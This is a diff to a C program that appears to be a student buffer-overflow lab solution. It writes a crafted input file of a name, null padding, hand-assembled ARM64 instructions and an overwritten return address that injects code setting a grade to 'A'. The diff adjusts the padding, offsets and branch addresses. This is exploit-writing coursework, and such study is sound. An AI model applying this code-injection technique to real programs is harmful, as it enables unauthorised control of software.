@@ -20,8 +20,10 @@ int main(void) {
 
     fprintf(psFile, "Richard Gomez");
     putc('\0', psFile);
+    putc('\0', psFile);
+    putc('\0', psFile);
 
-    adrInstruction = MiniAssembler_adr(0, 0x420044, 0x420066);
+    adrInstruction = MiniAssembler_adr(0, 0x420044, 0x420068);
     fwrite(&adrInstruction, sizeof(unsigned int), 1, psFile);
 
     movInstruction = MiniAssembler_mov(1, 'A');
@@ -30,14 +32,14 @@ int main(void) {
     strbInstruction = MiniAssembler_strb(1, 0);
     fwrite(&strbInstruction, sizeof(unsigned int), 1, psFile);
     
-    bInstruction = MiniAssembler_b(0x400874, 0x420072);
+    bInstruction = MiniAssembler_b(0x400864, 0x420074);
     fwrite(&bInstruction, sizeof(unsigned int), 1, psFile);
 
-    for(i = 0; i < 18; i++) {
+    for(i = 0; i < 16; i++) {
         putc('\0', psFile);
     }
 
-    bssAddress = 0x420067;
+    bssAddress = 0x420068;
     fwrite(&bssAddress, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
